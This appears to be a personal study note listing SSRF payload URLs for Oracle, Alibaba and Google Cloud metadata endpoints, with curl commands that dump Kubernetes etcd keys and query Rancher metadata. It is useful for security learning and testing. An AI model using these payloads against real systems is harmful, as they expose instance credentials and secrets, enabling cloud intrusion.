Daily Notes : Day 56
Cloud SSRF - Part 1

Oracle :
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data
http://192.0.0.192/latest/attributes/

Alibaba :

http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id

Kubernetes ETCD : 
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true 

Rancher :
curl http://rancher-metadata/<version>/<path>

Google Cloud :
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true